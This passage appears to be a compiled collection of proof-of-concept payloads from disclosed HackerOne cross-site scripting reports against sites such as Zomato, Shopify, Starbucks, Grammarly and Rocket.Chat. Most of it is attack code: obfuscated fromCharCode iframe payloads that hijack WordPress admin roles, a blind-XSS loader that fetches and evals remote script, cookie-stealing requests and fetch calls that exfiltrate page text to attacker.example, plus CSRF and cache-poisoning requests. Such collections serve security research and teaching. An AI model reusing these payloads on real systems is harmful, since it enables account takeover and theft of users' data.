100,95,49,34,93,39,41,46,118,97,108,40,39,72,65,67,75,69,68,39,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59,10])) width=0 height=0 style=display:none;></iframe>
# … truncated …
```

## 41. [#487081](https://hackerone.com/reports/487081)  -  Stored XSS in Private Message component (BuddyPress)
*critical*

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,45,103,101,110,101,114,97,108,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,110,97,109,101,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,116,105,116,108,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,100,101,115,99,114,105,112,116,105,111,110,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,46,112,104,112,39,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;></iframe>
# … truncated …
```

## 42. [#487081](https://hackerone.com/reports/487081)  -  Stored XSS in Private Message component (BuddyPress)
*critical*

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,115,101,108,101,99,116,91,110,97,109,101,61,34,114,111,108,101,34,93,39,41,46,112,114,111,112,40,34,115,101,108,101,99,116,101,100,73,110,100,101,120,34,44,32,52,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;></iframe>
# … truncated …
```

## 43. [#751870](https://hackerone.com/reports/751870)  -  Reflected XSS in pubg.com
*low*

```http
GET /?p=iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq HTTP/1.1
Host: www.pubg.com
Referer: https://www.pubg.com/es/feed/
Cookie: _icl_current_language=en; _icl_visitor_lang_js=en-us; wpml_browser_redirect_test=0; __cfduid…
```

## 44. [#341969](https://hackerone.com/reports/341969)  -  DOM XSS in edoverflow.com/tools/respond due to unsafe usage of the innerHTML property.
*low*

```html
<html>
<script>
/* ===========================================
  Allow users to submit usernames and store 
  them in localStorage for future use.
============================================*/
document.getElementById("form").addEventListener("submit", function(){
    var triager = document.getElementById("triager").value;
    var hacker = document.getElementById("hacker").value;
    console.log(hacker); // Why is this not executing?
    document.body.innerHTML = document.body.innerHTML.replace('{{triager}}', triager);
    document.body.innerHTML = document.body.innerHTML.replace('{{username}}', hacker);
    //localStorage.setItem("triager", triager);

//var retrieve = localStorage.getItem("triager"); // Why does this return "null"?
//document.body.innerHTML = document.body.innerHTML.replace('{{triager}}', retriev
document.getElementById("remove").addEventListener("click", function(){
    localStorage.removeItem("triager");
});
</script>
</html>
```

## 45. [#961787](https://hackerone.com/reports/961787)  -  CSRF and XSS on www.acronis.com
*low*

```http
POST Data: token=a016902ceaeb6ae91c21302631fbbcfc&SN=818198181891891981981981516518198198&OrderId=&Submit=Send+E-mail%0D%0A

Payload: 1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--
```

## 46. [#186554](https://hackerone.com/reports/186554)  -  Stored XSS in Adress Book (starbucks.com/account/profile)
*low*

```
Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=███████&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.VerificationStatus=Override&IsAddress=true&__RequestVerificationToken=MDSbXzmn-5j18ck06PpT7Og05zgwOzgq8FMwiqTXIeUfcfRS-keyp9i_x0VbBaIfvUo7EhzYGMvvzPUc0WG5QqlG_YathJ80lgs-p3PCoyNfdvo_E-XY6JfoC9R4tPir0
```

## 47. [#1081167](https://hackerone.com/reports/1081167)  -  Read/Write arbitrary (non-HttpOnly) cookies on checkout pages via GoogleAnalyticsAdditionalScripts postMessage handler
*medium, $1,600*

```js
zc = function(cookieName, cookieValue, cookiePath, cookieDomain, trackingId, cookieExpire, cookieFlags) {
	// Check if the user is opt'd out, bail early
    optOut = userIsOptedOut(trackingId) ? false : /(^|\.)doubleclick\.net$/i.test(document.location.hostname) || "/" == cookiePath && /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/.test(cookieDomain) ? false : true;
    if (!optOut)
        return false;
    // Truncate the value past 1200 characters
    cookieValue && 1200 < cookieValue.length && (cookieValue = cookieValue.substring(0, 1200));
    // Build the cookie name
    cookie = cookieName + "=" + cookieValue + "; path=" + cookiePath + "; ";
    // If expiration was specified, add "expires" flag
    cookieExpire && (cookiePath += "expires=" + (new Date((new Date).getTime() + cookieExpire)).toGMTString() + "; ");
    // If cookieDomain set, add "domain" flag
    cookieDomain && "none" !== cookieDomain && (cookiePath += "domain=" + cookieDomain + ";");
    // Add any additional cookieFlags
    cookieFlags && (cookiePath += cookieFlags + ";");
    // Set the value
    changed = document.cookie;
    document.cookie = cookie;
    if (!(changed = changed != document.cookie))
        label: {
            value = getCookie(cookieName);
            for (idx = 0; idx < value.length; idx++)
                if (cookieValue == value[idx]) {
                    changed = true;
                    break label
                }
            changed = false
        }
    return changed
}
# … truncated …
```

## 48. [#314126](https://hackerone.com/reports/314126)  -  Blind XSS - Report review - Admin panel
*medium, $350*

```html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

## 49. [#534450](https://hackerone.com/reports/534450)  -  Account takeover through the combination of cookie manipulation and XSS
*high*

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://gnar.grammarly.com/cookies?name=grauth");
xhr.withCredentials = true;
xhr.onload = function () {
    this.open('GET', "https://<YOUR_DOMAIN_NAME>/" + this.response);
    this.send();
};
xhr.send();
```

## 50. [#1245787](https://hackerone.com/reports/1245787)  -  [Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`
*high*

```bash
curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' \
  -H 'Content-Type: application/json' \
  -d '{
        "auth_token": "gB7BT3iA3GhqoU_SWoRq",
        "document": {
          "external_id": "v1uyQZNg2vE",
          "fields": [
            {"name": "url", "value": "javascript:alert(1)", "type":  "enum"},
            {"name": "thumbnail_url", "value": "javascript:alert(1)", "type": "enum"},
            {"name": "channel_id", "value": "UCK8sQmJBp8GCxrOtXWBpyEA", "type": "enum"},
            {"name": "title", "value": "How It Feels [through Glass]", "type": "string"},
            {"name": "caption", "value": "Want to see how Glass actually feels?...", "type": "text"},
            {"name": "tags", "value": ["glass", "wearable computing", "google"], "type": "string"},
            {"name": "category_name", "value": "Science & Technology", "type": "string"},
            {"name": "category_id", "value": 28, "type": "enum"},
            {"name": "published_at", "value": "2013-02-20T10:47:18", "type": "date"},
            {"name": "duration", "value": 136, "type": "integer"},
            {"name": "view_count", "value": 14599202, "type": "integer"},
            {"name": "like_count", "value": 75952, "type": "integer"}
          ]
        }
     }'
# … truncated …
```

## 51. [#309367](https://hackerone.com/reports/309367)  -  [metascraper] Stored XSS in Open Graph meta properties read by metascrapper
*critical*

```javascript
const metascraper = require('metascraper')
const got = require('got')
const express = require('express')

const targetUrl = 'http://127.0.0.1:8080/article.html'

const app = express()

app.get('/scrap', function(req, res) {;
    (async() => {
        const {
            body: html,
            url
        } = await got(targetUrl)
        const metadata = await metascraper({
            html,
            url
        })
        console.log(metadata)  // see returned metadata in console:
        /*
            { author: null,
                date: null,
                description: 'The HR startups go to war.',
                image: 'http://127.0.0.1:8080/image',
                lang: 'en',
                logo: null,
                publisher: '<script src="http://127.0.0.1:8080/malware.js"></script>',
                title: 'test article',
                url: 'http://127.0.0.1:8080/article.html' }
        */
        // display content of metadata.publisher in the browser
        let __html = `
            <div>
                <p>site title: ${metadata.title}</p>
                <p>site publisher: ${metadata.publisher}</p>
# … truncated …
```

## 52. [#856836](https://hackerone.com/reports/856836)  -  Stored XSS on PyPi simple API endpoint
*medium, $3,000*

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

## 53. [#314126](https://hackerone.com/reports/314126)  -  Blind XSS - Report review - Admin panel
*medium, $350*

```html
<u>Reported by Merchant(ID)</u> : <a style="opacity: 1; color: #000000; text-decoration:underline" href="https://www.zomato.com/users/43211589">43211589</a><br><u>Report Reason ID</u> : 5 (Other (mention reason below).)<br><u>Additional Text</u> : H
H
H
H
H
''"&gt;<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

## 54. [#632017](https://hackerone.com/reports/632017)  -  Self-Stored XSS - Chained with login/logout CSRF
*medium, $300*

```html
<form target="attackerTokens" method="post" action="https://www.zomato.com/php/asyncLogin.php?access_token=██████">
	<input name='authResponse[accessToken]' value='█████'>
	<input name='authResponse[userID]' value='███'>
	<input name='authResponse[expiresIn]' value='5073'>
	<input name='authResponse[signedRequest]' value='████'>
	<input name='authResponse[reauthorize_required_in]' value='7774406'>
	<input name='authResponse[data_access_expiration_time]' value='1569568133'>
	<input type=submit>
</form>
<iframe name="attackerTokens"></iframe>

<!-- logout current session -->
<img src="https://www.zomato.com/logout">
<script>
setTimeout(function(){ document.forms[0].submit(); }, 1500); // login attackers account
setTimeout(function(){ window.location.href='http://zoma.to/link_to_review'; }, 4000); // redirect to XSS payload page
</script>
```

## 55. [#2089042](https://hackerone.com/reports/2089042)  -  yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge
*medium*

```
"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
```

## 56. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```bash
curl -X POST http://TARGET:3000/api/v1/livechat/message \
  -H 'Content-Type: application/json' \
  -d '{
    "token":"poc-token-001",
    "rid":"ROOM_ID",
    "msg":"<img src=x onerror=\"fetch(\\\"https://attacker.example/exfil?d=\\\"+btoa(document.body.innerText))\">"
  }'
```

## 57. [#1244731](https://hackerone.com/reports/1244731)  -  XSS at videostore.mtnonline.com/GL/*.aspx via all parameters
*medium*

```
https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27><input%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus>
```

## 58. [#232174](https://hackerone.com/reports/232174)  -  XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications
*high, $5,000*

```xml
<svg onload="alert(document.domain);" height="16" width="16">
```

## 59. [#308155](https://hackerone.com/reports/308155)  -  [html-janitor] Passing user-controlled data to clean() leads to XSS
*critical*

```javascript
var myJanitor = new HTMLJanitor({tags:{p:{}}});
var cleanHtml = myJanitor.clean("<p><img src onerror=alert()><p>")
```

## 60. [#894518](https://hackerone.com/reports/894518)  -  xss on polaris.shopify.com/demo using postMessage
*low*

```html
<iframe id="ifrm" src="https://polaris.shopify.com/demo" height="100%" width="100%" frameborder="0"></iframe>
    <script>
      var ifrm = document.getElementById('ifrm');
      ifrm.onload = function() {
        ifrm.contentWindow.postMessage({ast: {
          code: "<img src='x' onError={() => alert(document.location)} />;",
        }}, '*');
      }
    </script>
```

## 61. [#317476](https://hackerone.com/reports/317476)  -  Account Takeover in Periscope TV
*high*

```http
GET /i/twitter/login?csrf=████ HTTP/1.1
Host: www.periscope.tv
Referer: https://www.periscope.tv/
cookie: ...
```

## 62. [#317476](https://hackerone.com/reports/317476)  -  Account Takeover in Periscope TV
*high*

```http
GET /i/twitter/login?csrf=██████ HTTP/1.1
Host: hackerone.com/www.periscope.tv
Referer: https://www.periscope.tv/
cookie: ...
```

## 63. [#1760213](https://hackerone.com/reports/1760213)  -  Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)
*high*

```http
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
```

## 64. [#275518](https://hackerone.com/reports/275518)  -  Blind XSS in Mobpub Marketplace Admin Production | Sentry via demand.mopub.com (User-Agent)
*high*

```http
GET /accounts/login/ HTTP/1.1
Referer: 1
X-Forwarded-For: 1
Host: demand.mopub.com
```

## 65. [#275518](https://hackerone.com/reports/275518)  -  Blind XSS in Mobpub Marketplace Admin Production | Sentry via demand.mopub.com (User-Agent)
*high*

```http
GET /accounts/login/ HTTP/1.1
Referer: 1
X-Forwarded-For: 1
Host: demand.mopub.com

'''
```

## 66. [#351171](https://hackerone.com/reports/351171)  -  Stored XXS @ https://steamcommunity.com/search/users/#text= via Profile Name
*medium, $750*

```
<a href="#" onclick="AddFriend(false,'PROFILE_NUMBER','NAME'); alert(document.cookie+''); $J(this).hide(); return false;" class="btnv6_blue_hoverfade btn_small btn_uppercase" style="display: none;">
    <span>Add as friend</span>
</a>
```

## 67. [#1598347](https://hackerone.com/reports/1598347)  -  Stored XSS on www.hackerone.com due to deleted S3-bucket from old page_widget
*medium*

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>Flipbook Widget</title></head>
<body style="margin:0; padding:0; background:transparent; overflow:hidden;"><div id="widget" style="float:left;"> <script id='vspoverlayrun'

codecredit='CopyRight_VSPWorldwide_Productions'
videofolder='hosted'
projectname='vmags43_overlay'
alignvideo='bottommiddle'
offsetx='0'
offsety='0'
waittime='1000'
autoplay='yes'
videowidth='300'
videoheight='480'
videoscale='1'
videoscalemobile='1'
posterscale='0.5'
clickvideo='close'
autodim='0'
autodimcolor='#000000'

src='https://s3.amazonaws.com/vspcode/vspoverlayrun1.js'></script></div></body></html>
```

## 68. [#3606773](https://hackerone.com/reports/3606773)  -  Stored XSS via SVG Upload  -  check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)
*medium*

```http
POST /posting.php?mode=post&f=2 HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFFEaAfSerpQAkd4Q
x-requested-with: XMLHttpRequest
Cookie: ***********************************

------WebKitFormBoundaryFFEaAfSerpQAkd4Q
```

## 69. [#3606773](https://hackerone.com/reports/3606773)  -  Stored XSS via SVG Upload  -  check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)
*medium*

```http
POST /posting.php?mode=post&f=2 HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF4vyqZURwpTrUxKo
x-requested-with: XMLHttpRequest
Cookie: ***************************************

------WebKitFormBoundaryF4vyqZURwpTrUxKo
```

## 70. [#786976](https://hackerone.com/reports/786976)  -  HTML injection in email content
*medium*

```http
POST /graphql HTTP/1.1
Host: api.app.bitwala.com
content-type: application/json
Authorization: null
Origin: https://app.bitwala.com
Content-Length: 1188

{"operationName":"createIneligibleUser","variables":{"ineligibleUser":{"email":"dr.eamhope.aaa@gmail.com","firstName":"https://abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1>hacker</h1><a href='abc.com'>XXXX</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc","lastName":"https://abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1>hacker</h1><a href='abc.com'>XXXX</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc","addressCountry":"US","marketing":true,"locale":"en","token":"03AOLTBLRo4xtiJjci3-KF9cyHrmtCDjr-BORRjZT58NooOV6fkr4VLeRL2SqgVeXdX1NiJQCI6BHk97El0aKwJBuc9iUmtuxvZdvISyEZ4rYVgm3lEG8XxBBuhJzh0L_vUNBdbiOLGjoZyJgGf4R_Y6unX-dg7Wn4kjWDYkE25QIaGFNxS3YzDmp0e3GmN47UhZjpp14KIlfP9dpUqqleJytN2nJs068HfMjZM9d-7Etfv3YG0brkyVP_nMxXouKZARX9d1o7AXMGyykqDWVeB8e0iIuuFHpNkjEIqDVi6Af6Ch87fM5gXwDgr86PAzKyA-vrUZoahuhKhG71N-soh8gn_XsEiqCSGyS76ox20kr40diSu7Hh8Hzt_hKeZ_sMQd_yHqjpbBxkFO_jWSzkpcExmpBb4qHlFW_JrDNEi5gVXeGA3ZJ8CKk","identificationDocumentType":"DE:PASSPORT_ID_CARD"}},"query":"mutation createIneligibleUser($ineligibleUser: CreateIneligibleUserInput!) {\n  createIneligibleUser(ineligibleUser: $ineligibleUser)\n}\n"}
# … truncated …
```

## 71. [#921635](https://hackerone.com/reports/921635)  -  DOM XSS on duckduckgo.com search
*medium*

```http
POST /settings.js HTTP/1.1
Host: duckduckgo.com
Content-Length: 248

{
```

## 72. [#921635](https://hackerone.com/reports/921635)  -  DOM XSS on duckduckgo.com search
*medium*

```http
POST /settings.js HTTP/1.1
Host: duckduckgo.com
Content-Length: 211

{
```

## 73. [#395845](https://hackerone.com/reports/395845)  -  url.parse() hostname spoofing via javascript: URIs
*medium*

```js
let parsedUrl = UrlHelper.parse(url); // url = javAscript:alert(1);a='@localhost/'
if (parsedUrl.hostname === 'localhost') { // parsedUrl.hostname = localhost
  return true; // and do something like window.location = url 
}
```

## 74. [#1102018](https://hackerone.com/reports/1102018)  -  Stored unauth XSS in calendar event via CSRF
*medium*

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://<YOUR CONCRETE5 TESTING SERVER IP>/index.php/ccm/calendar/dialogs/event/add/save" method="POST">
      <input type="hidden" name="caID" value="1" />
      <input type="hidden" name="name" value="csrf&#95;xss" />
      <input type="hidden" name="description" value="&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="cID" value="0" />
      <input type="hidden" name="event&#95;repetitionSetID&#91;&#93;" value="1234" />
      <input type="hidden" name="event&#95;repetitionID&#95;1234" value="0" />
      <input type="hidden" name="event&#95;pdStartDate&#95;pub&#95;1234" value="2&#47;12&#47;21" />
      <input type="hidden" name="event&#95;pdStartDate&#95;1234" value="2021&#45;02&#45;12" />
      <input type="hidden" name="event&#95;pdStartDateSelectTime&#95;1234" value="11&#58;00am" />
      <input type="hidden" name="publishAction" value="approve" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

## 75. [#374100](https://hackerone.com/reports/374100)  -  Reflected xss in Serendipity's /index.php
*medium*

```http
POST /index.php?frontpage HTTP/1.1
Content-Length: 118
Content-Type: application/x-www-form-urlencoded
Referer: https://blog.fuzzing-project.org/
Cookie: s9y_320982y345h324j56e04069=78uvbj9fk2u4jyh562u3j46jdt81tod; serendipity[url]=1; serendipity…
Host: blog.fuzzing-project.org

serendipity%5bisMultiCat%5d=Go%21&serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25<%20><ScRiPt%20>prompt(1)</ScRiPt>
```

## 76. [#398054](https://hackerone.com/reports/398054)  -  DOM Based XSS in www.hackerone.com via PostMessage
*low, $500*

```javascript
{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"javascript:alert(document.domain);//","aliId":17144124}}}
```

## 77. [#632017](https://hackerone.com/reports/632017)  -  Self-Stored XSS - Chained with login/logout CSRF
*medium, $300*

```html
<script>
setTimeout(function(){ document.forms[0].submit(); }, 1500); // login attackers account
setTimeout(function(){ window.location.href='http://zoma.to/link_to_review'; }, 4000); // redirect to XSS payload page
</script>
```

## 78. [#1106238](https://hackerone.com/reports/1106238)  -  Stored XSS via Mermaid Prototype Pollution vulnerability
*high, $3,000*

```
let userStyles = '';
  // user provided theme CSS
  if (cnf.themeCSS !== undefined) {
    userStyles += `\n${cnf.themeCSS}`;
  }
  // user provided theme CSS
  if (cnf.fontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;
  }
  // user provided theme CSS
  if (cnf.altFontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;
  }
```

## 79. [#1103258](https://hackerone.com/reports/1103258)  -  Stored DOM XSS via Mermaid chart
*high, $3,000*

```
const stylis = new Stylis();
  const rules = stylis(`#${id}`, getStyles(graphType, userStyles, cnf.themeVariables));

  const style1 = document.createElement('style');
  style1.innerHTML = rules;
  svg.insertBefore(style1, firstChild);
```

## 80. [#1404804](https://hackerone.com/reports/1404804)  -  Email templates XSS by filterXSS bypass
*high, $1,250*

```js
onIgnoreTag: function (e, t) {
   return "!--[if" === e || "![endif]--" === e || "<!-->" === t ? t : void 0; 
},
```

## 81. [#241619](https://hackerone.com/reports/241619)  -  DOM-based XSS in store.starbucks.co.uk on IE 11
*low*

```html
<script>
function poc() {
        var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>', 
            win = window.open(url);
        setTimeout(function(){win.location=url}, 5000);
}
</script>
```

## 82. [#894518](https://hackerone.com/reports/894518)  -  xss on polaris.shopify.com/demo using postMessage
*low*

```html
<script>
      var ifrm = document.getElementById('ifrm');
      ifrm.onload = function() {
        ifrm.contentWindow.postMessage({ast: {
          code: "<img src='x' onError={() => alert(document.location)} />;",
        }}, '*');
      }
    </script>
```

## 83. [#423218](https://hackerone.com/reports/423218)  -  H1514 DOM XSS on checkout.shopify.com via postMessage handler on /:id/sandbox/google_maps
*medium, $500*

```js
var frame = document.createElement("iframe");
frame.src = "https://checkout.shopify.com/4736483384/sandbox/google_maps";
frame.onload = function() {
  frame.contentWindow.postMessage("shopify_google_api:" + JSON.stringify({
    action: "createMapAndMarkers", 
    body: [{
      title: "<img src=xx: onerror=alert(document.domain)>"
    }]
  }), "*");
}
document.body.appendChild(frame);
```

## 84. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```html
<p><strong>guest-2</strong> (Wed, 03 Jun 2026 13:23:22 GMT):<br/>
<img src=x onerror="fetch(\"https://attacker.example/exfil?d=\"+btoa(document.body.innerText))">
</p>
```

## 85. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```html
<img src=x onerror="fetch('https://attacker.example/exfil',{method:'POST',body:btoa(document.body.innerText)})">
```

## 86. [#1441988](https://hackerone.com/reports/1441988)  -  Stored XSS at https://linkpop.com
*medium*

```
HTTP/1.1 200 OK
Cookies

{"data":{"pageUpdate":{"page":{"id":"12617","slug":"testnaglinagli","title":"\"\u003e\u003ch1\u003enagli\u003c/h1\u003e\"\u003e\u003cscript sr","bio":"\"\u003e\u003cScript src=https://naglinagli.xss.ht\u003e\u003c/script\u003e${7*7}{{7*7}}","media":{"id":"36361","signedBlobId":"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBZ21PIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--84ffd51a70b79ab6faaec2d6c3e7cca38f907f30","url":"https://cdn.shopify.com/b/shopify-linkpop-prod/q85t5nppud8qfjo1dvg0ql3p01oe.png","__typename":"Media"},"themeSettings":{"backgroundColor":"#F0EFEC","fontColor":"#000","primaryFont":"Roboto","secondaryFont":""},"__typename":"Page"},"errors":null,"__typename":"PageUpdatePayload"},"linksCreate":{"page":{"id":"12617","links":[{"id":"254183","title":"\"\u003e\u003ch1\u003etesT\u003c/h1\u003e${7*7}{{7*7}}","url":"javascript:alert(document.domain)","media":{"id":"36362","signedBlobId":"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBZ3FPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--54c67556358d19ddba24dd01f4130d1b2641b16f","url":"https://cdn.shopify.com/b/shopify-linkpop-prod/u7qrfhm16ma74bf3tvwn2lun4vn1.png","__typename":"Media"},"__typename":"ExternalLink"}],"socialMediaAccounts":[{"id":"30879","handle":"javascript:alert(1)","network":"facebook","__typename":"SocialMediaAccount"},{"id":"30878","handle":"javascript:alert(1)","network":"shop","__typename":"SocialMediaAccount"}],"__typename":"Page"},"errors":null,"__typename":"LinksCreatePayload"}}}
# … truncated …
```

## 87. [#1818163](https://hackerone.com/reports/1818163)  -  reflected XSS in [www.equifax.com]
*medium*

```html
<script type="text/javascript">
           window.onload = function(e){
            	Analytics.trackEvent('emptySearch',{internalSearchTerm: "broook" , numOfSearchResultsReturned: 0});
            	}
           </script>
```

## 88. [#1818163](https://hackerone.com/reports/1818163)  -  reflected XSS in [www.equifax.com]
*medium*

```html
<script type="text/javascript">
	      window.onload = function(e){
	          Analytics.trackEvent('SEARCHRETURNED',{internalSearchTerm: "" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 167});            	
	               	}
	     </script>
```

## 89. [#2389565](https://hackerone.com/reports/2389565)  -  Action Text XSS (Rails 7.1.x)
*medium*

```js
function escapeHTML(str) {
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(str));
    return div.innerHTML;
}

html = "<img src=. onerror='alert(location)' />"
html_text = '<action-text-attachment content-type="text/html" content="'+ escapeHTML (html) +'"></action-text-attachment>'

csrfToken = document.querySelector("meta[name='csrf-token']").content

fetch("http://localhost:3000/blogs", {
  "headers": {
  	"content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "x-csrf-token": csrfToken,
  },
